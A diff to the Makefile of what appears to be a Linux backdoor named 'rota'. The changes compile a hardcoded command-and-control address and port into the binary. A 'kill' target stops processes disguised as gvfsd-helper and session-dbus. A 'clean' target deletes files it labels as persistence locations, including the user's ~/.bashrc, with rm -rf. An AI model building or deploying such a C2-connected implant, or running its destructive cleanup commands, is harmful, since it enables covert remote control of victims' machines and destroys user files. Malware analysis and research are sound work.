@@ -1,5 +1,9 @@
 CC=gcc
-FLAGS=-ggdb -Wall -DDEBUG
+FLAGS=-ggdb -DDEBUG -Winfinite-recursion -Wall
+
+#update Makefile here
+C2_SERVER='"10.10.2.228"'
+C2_PORT=1443
 
 all: compile
 
@@ -7,17 +11,17 @@ bins:
 	mkdir -p ./bin/
 
 compile: bins
-	$(CC) $(FLAGS) -I ./inc/ $(wildcard ./src/*.c) -o ./bin/rota
+	$(CC) $(FLAGS) -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ $(wildcard ./src/*.c) -o ./bin/rota
 
 kill:
 	pkill gvfsd-helper
 	pkill session-dbus
 
 clean:
-	ipcrm -M 0x0064b2e2
-	rm -rf ./bin
 	rm -rf ~/.config/au-tostart
-	rm -rf ~/.gvfsd
-#rm -rf ~/.bashrc
-	rm -rf ~/.X11
-#rm -rf ~/.dbus
+	rm -rf ~/.gvfsd 	# Persistence file location
+	rm -rf ~/.dbus		# Persistence file location
+	rm -rf ~/.bashrc 	# Persistence file
+	rm -rf ./bin 		# Local bins
+	rm -rf ~/.X11 		# Lock files
+	ipcrm -M 0x0064b2e2 # Shared memory
